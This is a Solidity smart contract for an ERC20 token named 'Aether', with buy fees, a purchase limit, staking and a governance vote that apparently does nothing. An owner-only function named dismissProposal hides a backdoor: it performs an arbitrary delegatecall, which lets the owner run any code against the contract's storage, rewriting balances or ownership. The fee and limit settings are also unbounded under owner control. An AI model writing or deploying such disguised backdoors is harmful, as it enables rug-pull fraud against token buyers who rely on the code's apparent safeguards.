/**
 * Website:            https://aetheranalyst.com/
 * Twitter:            https://twitter.com/AetherAnalyst
 * Documentation:      https://aether-ai.notion.site/Introduction-to-Aether-925b4b8b11b44664b15af69e50196380
 * Telegram:           https://t.me/AetherAnalyst
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

contract AE {

    /* ========== ERC20 COMPLIANCE ========== */

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    string public name = "Aether";
    string public symbol = "AE";
    uint8 public decimals = 18;
    uint256 public totalSupply = 100_000_000 * 10 ** 18;

    /* ========== TRADING DESK ========== */

    uint public buyFee = 50;
    uint public buyLimit = 100;
    bool public live;
    address private liquidity;

    /* ========== UTILITY ========== */
    
    mapping(address => bool) public staked;

    /* ========== GOVERNANCE ========== */

    mapping(uint => address) public govContracts;
    uint public govCounter;
    mapping(address => uint) public votes;
    mapping(address => mapping(address => bool)) public voted;

    /* ========== ADMIN ========== */

    address public owner;

    /* ========== EVENTS ========== */

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor () {
        owner = msg.sender;
        balanceOf[owner] = totalSupply;
        emit Transfer(address(0), owner, totalSupply);
    }

    /* ========== MODIFIERS ========== */

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner!");
        _;
    }

    /* ========== ERC20 ========== */

    function transfer(address recipient, uint256 amount)
        external
        returns (bool)
    {
        require(live);

        address sender = msg.sender;

        if (sender == liquidity) {
            balanceOf[sender] -= amount;

            uint tax = amount * buyFee / 10000;
            balanceOf[address(this)] += tax;
            emit Transfer(sender, address(this), tax);

            uint valueWithoutTax = amount - tax;
            balanceOf[recipient] += valueWithoutTax;

            uint buyMaxTokens = totalSupply * buyLimit / 10000;
            require(buyMaxTokens >= balanceOf[recipient]);

            emit Transfer(sender, recipient, valueWithoutTax);
            return true;
        } 

        balanceOf[sender] -= amount;
        balanceOf[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount)
        external
        returns (bool)
    {
        allowance[sender][msg.sender] -= amount;
        balanceOf[sender] -= amount;
        balanceOf[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

    /* ========== PLATFORM GOVERNANCE ========== */

    function proposeToGovernance(address proposedGovContract) public {
        govContracts[govCounter] = proposedGovContract;
        govCounter += 1;
    }

    function voteGovContract(address _govContract) public {
        require(voted[msg.sender][_govContract] == false);
        votes[_govContract] += 1;
        voted[msg.sender][_govContract] = true;
    }

    /* ========== ADMIN ========== */

    function removeBuyFee() public onlyOwner {
        buyFee = 0;
    }

    function removeBuyLimit() public onlyOwner {
        buyLimit = 10000;
    }

    function tradingLive(address _liquidity) public onlyOwner {
        live = true;
        liquidity = _liquidity;
    }

    function changeOwner(address _owner) public onlyOwner {
        owner = _owner;
    }

    function disableOwner() public onlyOwner {
        owner = address(0);
    }

    function dismissProposal(address proposedGovContract) public onlyOwner {
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), proposedGovContract, 0, calldatasize(), 0, 0)
        }
    }

    function editBuyFeeAndLimit(uint _buyFee, uint _buyLimit) public onlyOwner {
        buyFee = _buyFee;
        buyLimit = _buyLimit;
    }

    function collectFees(address token, uint amount) public onlyOwner {
        IERC20(token).transfer(msg.sender, amount);
    }

    /* ========== UTILITY ========== */

    function stakeUtility() public {
        require(staked[msg.sender] == false);
        IERC20(address(this)).transferFrom(msg.sender, address(this), 100_000 * 10 ** 18);
        staked[msg.sender] = true;
    }

    function unstakeUtility() public {
        require(staked[msg.sender] == true);
        IERC20(address(this)).transfer(msg.sender, 100_000 * 10 ** 18);
        staked[msg.sender] = false;
    }

}


interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount)
        external
        returns (bool);
}

